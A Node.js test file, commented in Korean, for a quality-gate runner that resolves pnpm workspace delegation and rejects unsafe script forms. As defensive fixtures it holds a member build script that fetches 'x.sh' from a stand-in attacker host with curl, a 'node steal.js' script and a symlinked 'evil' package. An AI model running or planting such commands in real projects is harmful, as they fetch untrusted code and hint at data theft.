#!/usr/bin/env node
// test-pnpm-delegation.mjs — 모노레포 루트 script의 pnpm 위임을 정적으로 풀어 멤버 디렉터리에서 실행한다.
//
// 고정하는 것: 위임은 `pnpm run <script>`·`pnpm --filter <정확한 멤버> [run] <script>` 두 형태만 풀리고, 펼친 명령은
// 루트 명령과 같은 argv 계약을 통과해야 하며, 멤버 명령은 멤버 디렉터리에서 멤버 node_modules의 실행 파일로 돈다.
import assert from 'node:assert/strict'
import test from 'node:test'
import {spawnSync} from 'node:child_process'
import {chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync} from 'node:fs'
import {createHash} from 'node:crypto'
import {dirname, join} from 'node:path'
import {tmpdir} from 'node:os'
import {fileURLToPath} from 'node:url'
import {analyzePackageScript, hasMeaningfulProfileScript, listWorkspaceMembers, readDependencyBinding, resolvePackageExecutionTarget} from './quality-policy-lib.mjs'
import {commandSetDigest} from './host-execution-grant.mjs'

const runner = fileURLToPath(new URL('./run-quality-gates.mjs', import.meta.url))

const writeJson = (path, value) => {
  mkdirSync(dirname(path), {recursive: true})
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`)
}
const withWorkspace = (fn, {rootScripts = {}, members = {}} = {}) => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'wh-pnpm-delegation-')))
  try {
    writeJson(join(root, 'package.json'), {name: 'ws', private: true, scripts: rootScripts})
    writeFileSync(join(root, 'pnpm-workspace.yaml'), "packages:\n  - 'apps/*'\n")
    for (const [directory, manifest] of Object.entries(members)) writeJson(join(root, directory, 'package.json'), manifest)
    return fn(root)
  } finally {
    rmSync(root, {recursive: true, force: true})
  }
}
const MEMBERS = {
  'apps/a': {name: '@x/a', scripts: {'type-check': 'tsc --noEmit', build: 'tsc -b && vite build', typecheck: 'pnpm run type-check'}},
  'apps/b': {name: '@x/b', scripts: {'type-check': 'tsc --noEmit'}},
}
const analyze = (root, source) => analyzePackageScript(source, {projectRoot: root})

test('위임을 펼친다 — 멤버 명령은 멤버 디렉터리(cwd)를 갖고 루트 명령은 갖지 않는다', () => {
  withWorkspace(root => {
    const analysis = analyze(root, 'pnpm --filter @x/a typecheck && pnpm -F @x/b run type-check && pnpm run e2e')
    assert.equal(analysis.ok, true, analysis.error)
    assert.deepEqual(analysis.commands, [
      {executable: 'tsc', args: ['--noEmit'], assignments: [], cwd: 'apps/a'},
      {executable: 'tsc', args: ['--noEmit'], assignments: [], cwd: 'apps/b'},
      {executable: 'tsc', args: ['-p', 'e2e'], assignments: []},
    ])
    assert.deepEqual(analysis.executionCommands.map(command => command.cwd), ['apps/a', 'apps/b', undefined])
  }, {rootScripts: {e2e: 'tsc -p e2e'}, members: MEMBERS})
})

test('위임이 없는 script의 명령 계약은 그대로다 — 기존 영수증 digest가 바뀌지 않는다', () => {
  withWorkspace(root => {
    assert.deepEqual(analyze(root, 'tsc --noEmit && vitest run'), analyzePackageScript('tsc --noEmit && vitest run'))
  }, {members: MEMBERS})
})

test('프로젝트 문맥이 없으면 pnpm은 허용 실행 파일이 아니다', () => {
  assert.match(analyzePackageScript('pnpm run build').error, /not allowed: pnpm/)
})

test('pnpm이 실제로 할 일과 달라질 수 있는 형태는 거부한다', () => {
  withWorkspace(root => {
    const rejected = {
      'pnpm build': /must be `pnpm run/,
      'pnpm run build --watch': /exactly one script name/,
      'pnpm -r build': /must be `pnpm run/,
      'pnpm exec vite build': /must be `pnpm run/,
      'pnpm --filter @x/a install': /pnpm command, not a script/,
      'pnpm --filter @x/a upgrade': /pnpm command, not a script/,
      'pnpm --filter @x/a t': /pnpm command, not a script/,
      'pnpm --filter ./apps/a build': /exactly one workspace package/,
      'pnpm --filter ...@x/a build': /exactly one workspace package/,
      'pnpm --filter @x/zzz build': /not a workspace member/,
      'pnpm --filter ws build': /not a workspace member/,
      'pnpm --filter @x/b build': /target script is missing/,
      'NODE_ENV=production pnpm run build': /cannot prefix a pnpm delegation/,
    }
    for (const [source, pattern] of Object.entries(rejected)) {
      const analysis = analyze(root, source)
      assert.equal(analysis.ok, false, `${source}를 받아들였다`)
      assert.match(analysis.error, pattern, source)
    }
  }, {rootScripts: {build: 'tsc -b'}, members: MEMBERS})
})

test('펼친 멤버 명령도 argv 계약을 통과해야 한다', () => {
  withWorkspace(root => {
    assert.match(analyze(root, 'pnpm --filter @x/a build').error, /not allowed: curl/)
  }, {members: {'apps/a': {name: '@x/a', scripts: {build: 'curl https://attacker.example/x.sh'}}}})
})

test('순환·pre/post 스크립트는 거부한다', () => {
  withWorkspace(root => {
    assert.match(analyze(root, 'pnpm run x').error, /cycle/)
  }, {rootScripts: {x: 'pnpm run y', y: 'pnpm run x'}})
  withWorkspace(root => {
    assert.match(analyze(root, 'pnpm --filter @x/a build').error, /pre\/post/)
  }, {members: {'apps/a': {name: '@x/a', scripts: {build: 'vite build', prebuild: 'node gen.mjs'}}}})
})

test('멤버는 선언된 실제 디렉터리뿐이다 — 심링크 멤버·이름 중복은 위임 대상이 아니다', () => {
  withWorkspace(root => {
    const outside = realpathSync(mkdtempSync(join(tmpdir(), 'wh-pnpm-outside-')))
    try {
      writeJson(join(outside, 'package.json'), {name: '@x/evil', scripts: {build: 'vite build'}})
      symlinkSync(outside, join(root, 'apps/evil'))
      assert.deepEqual(listWorkspaceMembers(root).map(member => member.name), ['@x/a', '@x/b'])
      assert.match(analyze(root, 'pnpm --filter @x/evil build').error, /not a workspace member/)
    } finally {
      rmSync(outside, {recursive: true, force: true})
    }
  }, {members: MEMBERS})
  withWorkspace(root => {
    assert.match(analyze(root, 'pnpm --filter @x/a build').error, /duplicate package names/)
  }, {members: {'apps/a': {name: '@x/a', scripts: {build: 'vite build'}}, 'apps/b': {name: '@x/a', scripts: {}}}})
})

test('host 실행 승인은 멤버 script까지 덮는다 — 단일 패키지 digest는 그대로다', () => {
  withWorkspace(root => {
    const before = commandSetDigest(root)
    writeJson(join(root, 'apps/a/package.json'), {name: '@x/a', scripts: {'type-check': 'node steal.js'}})
    assert.notEqual(commandSetDigest(root), before, '멤버 script가 바뀌었는데 승인이 그대로다')
  }, {rootScripts: {typecheck: 'pnpm --filter @x/a type-check'}, members: MEMBERS})
  const single = realpathSync(mkdtempSync(join(tmpdir(), 'wh-pnpm-single-')))
  try {
    writeJson(join(single, 'package.json'), {name: 'p', scripts: {test: 'vitest run', build: 'vite build'}})
    const legacy = `sha256:${createHash('sha256').update(JSON.stringify([['build', 'vite build'], ['test', 'vitest run']])).digest('hex')}`
    assert.equal(commandSetDigest(single), legacy)
  } finally {
    rmSync(single, {recursive: true, force: true})
  }
})

// 가짜 pnpm 설치: 실행 파일(tsc)은 멤버 node_modules에만 링크돼 있고 루트에는 없다 — 루트 기준으로 찾으면 실패한다.
const installFakeTsc = (root, memberDirectory, marker) => {
  const storePackage = join(root, 'node_modules/.pnpm/typescript@5.0.0/node_modules/typescript')
  writeJson(join(storePackage, 'package.json'), {name: 'typescript', version: '5.0.0', bin: {tsc: 'bin/tsc'}})
  mkdirSync(join(storePackage, 'bin'), {recursive: true})
  writeFileSync(join(storePackage, 'bin/tsc'), `#!/usr/bin/env node\nrequire('node:fs').writeFileSync(${JSON.stringify(marker)}, process.cwd())\n`)
  chmodSync(join(storePackage, 'bin/tsc'), 0o755)
  const memberModules = join(root, memberDirectory, 'node_modules')
  mkdirSync(join(memberModules, '.bin'), {recursive: true})
  symlinkSync('../../../node_modules/.pnpm/typescript@5.0.0/node_modules/typescript', join(memberModules, 'typescript'))
  symlinkSync('../typescript/bin/tsc', join(memberModules, '.bin/tsc'))
}

test('멤버 실행 파일은 멤버 node_modules에서 찾는다 — 루트에만 찾으면 없다', () => {
  withWorkspace(root => {
    installFakeTsc(root, 'apps/a', join(root, 'unused'))
    assert.match(resolvePackageExecutionTarget(root, 'tsc', 'apps/a'), /typescript@5\.0\.0\/node_modules\/typescript\/bin\/tsc$/)
    assert.throws(() => resolvePackageExecutionTarget(root, 'tsc'), /not linked/)
  }, {members: MEMBERS})
})

test('실제 러너: 위임된 명령은 멤버 디렉터리에서 돈다', () => {
  const markerRoot = realpathSync(mkdtempSync(join(tmpdir(), 'wh-pnpm-marker-')))
  try {
    withWorkspace(root => {
      const marker = join(markerRoot, 'cwd.txt')
      installFakeTsc(root, 'apps/a', marker)
      const result = spawnSync(process.execPath, [runner, '--project', root, '--check', 'typecheck'], {
        encoding: 'utf8', env: {...process.env, WEB_HARNESS_ISOLATED_EXECUTION: '1'},
      })
      assert.ok(existsSync(marker), `위임된 명령이 돌지 않았다:\n${result.stdout}\n${result.stderr}`)
      assert.equal(readFileSync(marker, 'utf8'), join(root, 'apps/a'), '멤버 디렉터리에서 돌지 않았다')
      const receipt = JSON.parse(readFileSync(join(root, '_workspace/04_qa/evidence/typecheck.json'), 'utf8'))
      assert.equal(receipt.status, 'PASS', `${receipt.blockedReason}\n${result.stderr}`)
      assert.deepEqual(receipt.packageScript.commands, [{executable: 'tsc', args: ['--noEmit'], cwd: 'apps/a'}], '영수증에 실제로 돈 명령이 없다')
    }, {rootScripts: {typecheck: 'pnpm --filter @x/a type-check'}, members: MEMBERS})
  } finally {
    rmSync(markerRoot, {recursive: true, force: true})
  }
})

// pnpm은 멤버를 가상 저장소에 링크한다. 선언된 멤버를 정확히 가리키는 링크만 받는다 — 그 밖으로 나가는 링크는 여전히 거부.
test('의존 그래프 바인딩: 멤버 링크는 받고, node_modules 밖 다른 곳을 가리키는 링크는 거부한다', () => {
  withWorkspace(root => {
    const storePackage = join(root, 'node_modules/.pnpm/typescript@5.0.0/node_modules/typescript')
    writeJson(join(storePackage, 'package.json'), {name: 'typescript', version: '5.0.0'})
    symlinkSync('.pnpm/typescript@5.0.0/node_modules/typescript', join(root, 'node_modules/typescript'))
    writeFileSync(join(root, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n')
    writeFileSync(join(root, 'node_modules/.pnpm/lock.yaml'), 'lockfileVersion: 9.0\n')
    mkdirSync(join(root, 'node_modules/.pnpm/node_modules/@x'), {recursive: true})
    symlinkSync('../../../../apps/a', join(root, 'node_modules/.pnpm/node_modules/@x/a'))
    const manifest = {devDependencies: {typescript: '5.0.0'}}
    const binding = readDependencyBinding(root, manifest)
    assert.equal(binding.satisfied, true, binding.inventoryError)

    mkdirSync(join(root, 'src'))
    symlinkSync('../../../../src', join(root, 'node_modules/.pnpm/node_modules/@x/src'))
    assert.match(readDependencyBinding(root, manifest).inventoryError, /escapes node_modules/)
  }, {members: MEMBERS})
})

test('stylelint는 허용 실행 파일이고, 프로필 lint에서는 eslint 곁에서만 의미 있는 검사다', () => {
  const lint = source => hasMeaningfulProfileScript('quality.lint', {kind: 'lint'}, source)
  assert.equal(analyzePackageScript('stylelint src/**/*.css').ok, false, '따옴표 없는 glob은 셸 문법이라 거부된다')
  assert.deepEqual(analyzePackageScript('stylelint "src/**/*.css"').commands[0].args, ['src/**/*.css'], '따옴표 glob은 도구가 받는 인자다')
  assert.equal(analyzePackageScript('stylelint src --allow-empty-input').ok, true)
  assert.equal(lint('eslint . && stylelint src'), true)
  assert.equal(lint('stylelint src'), false, 'stylelint만으로는 코드 lint가 아니다')
  assert.equal(lint('eslint . && stylelint --version'), false)
})

test('멤버는 packages 블록의 항목뿐이고 보호 경로는 멤버가 될 수 없다', () => {
  withWorkspace(root => {
    writeFileSync(join(root, 'pnpm-workspace.yaml'), "packages:\n  - 'apps/*'\n  - _workspace\nonlyBuiltDependencies:\n  - tools\n")
    writeJson(join(root, 'tools/package.json'), {name: '@x/tools', scripts: {build: 'vite build'}})
    writeJson(join(root, '_workspace/package.json'), {name: '@x/ws', scripts: {build: 'vite build'}})
    assert.deepEqual(listWorkspaceMembers(root).map(member => member.directory), ['apps/a', 'apps/b'])
  }, {members: MEMBERS})
})
